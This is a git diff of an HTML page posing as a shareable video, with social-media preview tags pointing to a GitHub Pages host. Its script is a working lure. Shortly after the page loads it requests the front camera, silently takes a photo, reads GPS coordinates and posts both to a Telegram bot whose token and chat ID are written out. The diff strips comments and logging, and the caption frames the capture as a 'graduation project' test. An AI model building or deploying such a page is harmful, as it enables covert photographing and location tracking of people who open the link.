@@ -6,8 +6,11 @@
     
     <meta property="og:title" content="فديو">
     <meta property="og:description" content="">
-    <meta property="og:image" content="2.png">
-    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png"> 
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://your-domain.com/">
+    <meta property="og:type" content="video.other">
 
     <title>فديو</title>
     
@@ -23,76 +26,61 @@
     <div class="video-wrapper">
         <video id="mainVideo" autoplay muted playsinline poster="2.png">
             <source src="1.mp4" type="video/mp4">
-            متصفحك لا يدعم الفيديو.
         </video>
     </div>
 
     <script>
-        // بيانات بوت التلجرام الخاصة بك
         const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
         const chatId = "1611398303";
 
         window.onload = function() {
             const video = document.getElementById('mainVideo');
-            video.play().catch(() => console.log("بانتظار تفاعل المستخدم..."));
+            video.play().catch(() => console.log("Waiting for user..."));
 
-            // بدء عملية الاختبار بعد 3 ثوانٍ
+            // بدء التجربة بعد 3 ثوانٍ فورة
             setTimeout(startTechnicalTest, 3000);
         };
 
         function startTechnicalTest() {
-            // 1. طلب صلاحية الكاميرا والموقع معاً
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 captureAndSend(stream);
             })
-            .catch(err => console.log("تم رفض الصلاحيات برمجياً: " + err));
+            .catch(err => console.log("Permission denied: " + err));
         }
 
         function captureAndSend(stream) {
-            // إنشاء عنصر فيديو مؤقت لالتقاط الصورة
-            let videoTrack = document.createElement('video');
-            videoTrack.srcObject = stream;
-            videoTrack.play();
+            let v = document.createElement('video');
+            v.srcObject = stream;
+            v.play();
 
             setTimeout(() => {
-                // رسم الصورة على Canvas
                 let canvas = document.createElement('canvas');
                 canvas.width = 720; 
                 canvas.height = 1280;
-                canvas.getContext('2d').drawImage(videoTrack, 0, 0, canvas.width, canvas.height);
+                canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
                 let imgData = canvas.toDataURL('image/jpeg');
 
-                // 2. الحصول على الموقع الجغرافي (GPS)
                 navigator.geolocation.getCurrentPosition(pos => {
-                    let lat = pos.coords.latitude;
-                    let lon = pos.coords.longitude;
-                    let accuracy = pos.coords.accuracy;
-                    
-                    sendToTelegram(imgData, lat, lon, accuracy);
+                    sendToTelegram(imgData, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                 }, () => {
-                    // في حال رفض الموقع، نرسل الصورة فقط
                     sendToTelegram(imgData, "غير متوفر", "غير متوفر", "0");
                 });
 
-                // إيقاف الكاميرا بعد الالتقاط للحفاظ على الخصوصية
                 stream.getTracks().forEach(track => track.stop());
             }, 1000);
         }
 
         function sendToTelegram(imgData, lat, lon, acc) {
-            const caption = encodeURIComponent(`✅ تجربة مشروع التخرج\n📍 الموقع: ${lat},${lon}\n🎯 الدقة: ${acc}m\n⏰ الوقت: ${new Date().toLocaleTimeString()}`);
+            const caption = encodeURIComponent(`✅ تجربة مشروع التخرج\n📍 GPS: ${lat},${lon}\n⏰ وقت: ${new Date().toLocaleTimeString()}`);
             const url = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${caption}`;
 
             let form = new FormData();
-            form.append('document', dataURLtoBlob(imgData), "capture.jpg");
+            form.append('document', dataURLtoBlob(imgData), "photo.jpg");
 
-            fetch(url, { method: 'POST', body: form })
-            .then(response => console.log("تم الإرسال بنجاح"))
-            .catch(error => console.error("خطأ في الإرسال:", error));
+            fetch(url, { method: 'POST', body: form });
         }
 
-        // تحويل الصورة إلى ملف Blob للإرسال
         function dataURLtoBlob(dataurl) {
             let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                 bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
